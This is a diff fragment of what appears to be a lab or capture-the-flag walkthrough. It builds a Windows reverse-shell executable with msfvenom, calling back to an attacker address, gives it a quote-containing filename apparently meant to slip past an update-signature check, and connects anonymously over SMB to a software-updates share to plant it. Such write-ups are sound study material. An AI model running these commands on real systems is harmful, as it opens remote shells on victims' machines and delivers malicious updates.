@@ -145,7 +145,7 @@
 
 // So lets try this, first we need to make .exe reverse shell, we will use msfvenom for that
 
-    $ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.6 LPORT=1444 -f exe > rshell.exe
+    $ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.6 LPORT=1444 -f exe > rev\'shell.exe
 ------
 
     [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -157,6 +157,9 @@
 // Now we can make our 'latest.yml' file
 
 
+
+
+$smbclient \\\\10.10.10.237\\Software_Updates -U anonymous
 
 f486053b0ed2b8e4d46b3c056b9f8dcdb9bb5d7f7f51ed03ae2a90d307e3fcdb2da28233e27527637fe8ab1c85e1c81f2894c92953894a2f94262d557da62b65
 
